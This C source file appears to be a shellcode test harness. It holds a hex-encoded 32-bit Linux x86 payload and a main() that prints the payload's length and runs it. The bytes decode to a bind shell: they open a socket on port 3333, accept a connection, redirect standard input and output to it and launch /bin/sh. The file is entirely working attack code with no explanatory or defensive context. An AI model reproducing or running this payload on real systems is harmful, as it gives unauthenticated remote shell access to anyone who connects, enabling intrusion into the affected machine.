#include<stdio.h>
#include<string.h>

#define PORT_NUMBER "\x0d\x05" //od05 = 3333d

unsigned char code[] = \
"\xb8\x66\x00\x00\x00\xbb\x01\x00"
"\x00\x00\x6a\x00\x6a\x01\x6a\x02"
"\x89\xe1\xcd\x80\x89\xc6\xb8\x66"
"\x00\x00\x00\xbb\x02\x00\x00\x00"
"\x6a\x00\x6a\x00\x6a\x00\x66\x68"
PORT_NUMBER"\x66\x6a\x02\x89\xe7\x6a"
"\x10\x57\x56\x89\xe1\xcd\x80\xb8"
"\x66\x00\x00\x00\xbb\x04\x00\x00"
"\x00\x6a\x00\x56\x89\xe1\xcd\x80"
"\xb8\x66\x00\x00\x00\xbb\x05\x00"
"\x00\x00\x6a\x00\x6a\x00\x56\x89"
"\xe1\xcd\x80\x89\xc2\xb8\x3f\x00"
"\x00\x00\xb9\x00\x00\x00\x00\x89"
"\xd3\xcd\x80\xb8\x3f\x00\x00\x00"
"\xb9\x01\x00\x00\x00\x89\xd3\xcd"
"\x80\xb8\x3f\x00\x00\x00\xb9\x02"
"\x00\x00\x00\x89\xd3\xcd\x80\xba"
"\x00\x00\x00\x00\xb9\x00\x00\x00"
"\x00\x68\x2f\x73\x68\x00\x68\x2f"
"\x62\x69\x6e\x89\xe3\xb8\x0b\x00"
"\x00\x00\xcd\x80";

main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
